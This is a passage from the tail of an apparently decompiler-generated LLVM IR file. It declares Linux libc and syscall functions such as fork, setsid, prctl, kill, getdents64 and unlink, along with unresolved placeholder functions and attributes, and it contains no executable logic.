592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 368, 369, 370, 371 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
